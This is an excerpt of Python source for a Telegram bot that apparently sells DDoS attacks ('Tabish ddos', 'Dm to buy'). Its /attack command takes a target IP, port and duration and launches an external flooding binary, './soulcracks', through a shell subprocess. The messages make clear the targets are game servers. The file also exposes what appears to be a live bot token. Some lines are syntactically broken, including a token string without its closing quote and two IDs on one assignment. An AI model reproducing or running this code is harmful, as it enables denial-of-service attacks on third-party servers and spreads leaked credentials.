...
TELEGRAM_BOT_TOKEN = '7323159569:AAHpSSfIDKa4BlIiPc41b9ja6bJSAkotIOA
ADMIN_USER_ID = 1257888659 1173228870
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        help_text = (
            ...
            "*🔸 /start* - Start interacting with the bot. Dm to buy @Hack_chiye\n"
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! but form : @Hack_chiye /get_id*", parse_mode='Markdown')
        return
    message = (
        f"*🔥 Welcome to the Tabish ddos, {user_name}! 🔥*\n\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!* Dm to buy :@Hack_chiye", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return
    ...
    chat_id=chat_id,
    text=(
        f"*💀 WARNING: Bgmi ki chudai start h ! 💀*\n"
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./soulcracks {ip} {port} {duration} 300",
